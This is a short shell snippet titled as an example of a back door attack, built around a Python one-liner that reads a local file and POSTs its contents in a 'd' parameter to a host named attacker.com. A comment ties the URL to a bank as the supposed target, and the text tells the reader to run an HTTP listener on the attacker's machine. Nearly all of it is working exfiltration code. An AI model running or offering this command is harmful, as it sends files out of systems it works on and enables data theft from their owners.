# Way to exfaltrate file upload, an example of a back door attack 

# Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
export URL=http://attacker.com/ #should correspond to USC bank 
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
